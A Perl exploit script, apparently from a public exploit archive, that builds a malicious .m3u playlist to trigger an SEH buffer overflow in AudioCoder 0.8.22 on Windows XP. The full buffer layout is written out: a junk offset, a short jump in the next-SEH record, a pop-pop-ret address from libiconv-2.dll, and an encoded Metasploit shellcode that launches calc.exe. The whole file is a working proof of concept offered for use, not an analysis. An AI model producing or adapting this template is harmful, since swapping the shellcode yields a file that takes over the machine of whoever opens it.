#!/usr/bin/perl

###############################################################################
# Exploit Title: AudioCoder 0.8.22 (.m3u) - SEH Buffer Overflow
# Date: 10-18-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: AudioCoder 0.8.22 (http://www.mediacoderhq.com/audio/)
# Software Link: http://www.fosshub.com/download/AudioCoder-0.8.22.5506.exe
# Version: 0.8.22.5506
# Tested On: Windows XP SP3
# Creates an .m3u file to exploit a very basic seh bof:
# junk --> next seh (jmp to shellcode) --> seh (pop3 pop ret) --> shellcode
###############################################################################

my $buffsize = 5000; # sets buffer size for consistent sized payload
my $junk = "http://" . ("\x90" x 757); # offset to seh overwrite 
my $nseh = "\xeb\x14\x90\x90"; # overwrite next seh with jmp instruction (20 bytes)
my $seh = pack('V',0x6601228e); #overwrite seh w/ pop edi pop ebp ret from AudioCoder\libiconv-2.dll 
my $nops = "\x90" x 20; 

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R | 
# msfencode -e x86/shikata_ga_nai -c 1 -b '\x00\x0a\x0d\xff'
my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";

# fill remainder of buffer with junk chars; not necessary but useful
# to check remaining usable space for different sized payloads
my $fill = "\x43" x ($buffsize - (length($junk)+length($nseh)+length($seh)+length($nops)+length($shell))); # fills remainder of buffer 

my $buffer = $junk.$nseh.$seh.$nops.$shell.$fill; 

# write the exploit buffer to file
my $file = "audiocoder.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer) . "\n"; 
